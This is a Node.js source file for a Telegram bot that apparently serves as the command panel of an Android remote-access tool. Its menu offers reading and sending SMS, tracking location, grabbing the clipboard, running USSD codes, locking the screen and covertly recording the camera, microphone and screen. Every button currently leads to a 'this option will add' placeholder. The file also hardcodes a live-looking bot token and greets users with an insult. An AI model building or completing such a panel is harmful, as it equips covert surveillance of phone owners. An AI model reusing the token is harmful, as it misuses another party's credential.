const token = "7818062489:AAEh3vbk2z212B2Yls-aP6znsu-zcRa6Vc8";

const Telegrambot = require("node-telegram-bot-api");
const { Manager } = require("./manager");

const bot = new Telegrambot(token, { polling: true });
const manager = new Manager();

function makeFont(string) {
    const mapping = {
        'q': 'ǫ', 'w': 'ᴡ', 'e': 'ᴇ', 'r': 'ʀ',
        't': 'ᴛ', 'y': 'ʏ', 'u': 'ᴜ', 'i': 'ɪ',
        'o': 'ᴏ', 'p': 'ᴘ', 'a': 'ᴀ', 's': 's',
        'd': 'ᴅ', 'f': 'ғ', 'g': 'ɢ', 'h': 'ʜ',
        'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'z': 'ᴢ',
        'x': 'x', 'c': 'ᴄ', 'v': 'ᴠ', 'b': 'ʙ',
        'n': 'ɴ', 'm': 'ᴍ'
    };

    return string.split('').map(char => mapping[char] || char).join('');
}

function makeNumberFont(string) {
    const mapping = {
        '0': '𝟎', '1': '𝟏', '2': '𝟐',
        '3': '𝟑', '4': '𝟒', '5': '𝟓',
        '6': '𝟔', '7': '𝟕', '8': '𝟖', '9': '𝟗'
    };

    return string.split('').map(char => mapping[char] || char).join('');
}

bot.on("message", async (msg) => {
    await manager.add(msg.from.id);

    if (msg.text.startsWith("/start")){
        await manager.getUserById(msg.from.id, async (user) => {
            const date = new Date();
            if (user.status === "OK"){
                if (user.user.language === "eng" || user.user.language === "fa" || user.user.language === undefined){
                    await bot.sendMessage(
                        msg.chat.id,
                        makeFont("[ 🌐 ] - dont make me sad ") + `[ʙɪᴛᴄʜ](tg://openmessage?user_id=${msg.from.id})` + makeNumberFont(`\n[ ⌛ ] - ${date.getFullYear()}/${date.getMonth()}/${date.getDay()} - ${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}`) + makeFont("\n\n[ 🎛 ] - Panel is here"),
                        {
                            reply_to_message_id: msg.message_id,
                            reply_markup: {
                                inline_keyboard: [
                                    [
                                        {
                                            text: makeFont("users 👥"),
                                            callback_data: `key` //`getUsersFor_${msg.from.id}` // get users 
                                        },
                                        {
                                            text: makeFont("open url 🎞"),
                                            callback_data: `key`
                                        }
                                    ],
                                    [
                                        {
                                            text: makeFont("get notifs 👁"),
                                            callback_data: 'key'
                                        },
                                        {
                                            text: makeFont("send notif 🎲"),
                                            callback_data: 'key'
                                        },
                                        {
                                            text: makeFont("send toast 📃"),
                                            callback_data: 'key'
                                        }
                                    ],
                                    [
                                        {
                                            text: makeFont("get sims ☎"),
                                            callback_data: 'key'
                                        },
                                        {
                                            text: makeFont("watch sim info 🌚"),
                                            callback_data: 'key'
                                        }
                                    ],
                                    [
                                        {
                                            text: makeFont("vibrate phone 🍾"),
                                            callback_data: 'key'
                                        },
                                        {
                                            text: makeFont("get location 🍪"),
                                            callback_data: 'key'
                                        }
                                    ],
                                    [
                                        {
                                            text: makeFont("get all sms 🍷"),
                                            callback_data: 'key'
                                        },
                                        {
                                            text: makeFont("send sms 💎"),
                                            callback_data: 'key'
                                        },
                                        {
                                            text: makeFont("read sms ♻"),
                                            callback_data: 'key'
                                        }
                                    ],
                                    [
                                        {
                                            text: makeFont("installed apps 🎟"),
                                            callback_data: 'key'
                                        },
                                        {
                                            text: makeFont("clip board 🌮"),
                                            callback_data: 'key'
                                        },
                                        {
                                            text: makeFont("run ussd 🤺"),
                                            callback_data: 'key'
                                        }
                                    ],
                                    [
                                        {
                                            text: makeFont("change sound volume 🎃"),
                                            callback_data: "key"
                                        }
                                    ],
                                    [
                                        {
                                            text: makeFont("lock screen 🔐"),
                                            callback_data: "key"
                                        },
                                        {
                                            text: makeFont("unlock screen 🔓"),
                                            callback_data: "key"
                                        }
                                    ],
                                    [
                                        {
                                            text: makeFont("take screenshot 🕹"),
                                            callback_data: "key"
                                        },
                                        {
                                            text: makeFont("take cam shot 🎾"),
                                            callback_data: "key"
                                        },
                                        {
                                            text: makeFont("record front 🍗"),
                                            callback_data: "key"
                                        }
                                    ],
                                    [
                                        {
                                            text: makeFont("record back 🍬"),
                                            callback_data: "key"
                                        },
                                        {
                                            text: makeFont("record microphone ♦"),
                                            callback_data: "key"
                                        },
                                        {
                                            text: makeFont("record screen 🛰"),
                                            callback_data: "key"
                                        }
                                    ],
                                    [
                                        {
                                            text: makeFont("close"),
                                            callback_data: "close"
                                        }
                                    ]
                                ]
                            }
                        }
                    )
                }
            }
        })
    }
})

bot.on("callback_query", async (call) => {
    if (call.data === "close"){
        if (call.message.reply_to_message.from.id === call.from.id){
            await bot.deleteMessage(call.message.chat.id, call.message.message_id);
        }
    } else if (call.data === "key"){
        if (call.message.reply_to_message.from.id === call.from.id){
            await bot.editMessageText(makeFont("[ 🍡 ] - this option will add ..."), {
                chat_id: call.message.chat.id,
                message_id: call.message.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: makeFont("close"),
                                callback_data: "close"
                            }
                        ]
                    ]
                }
            })
        }
    }
})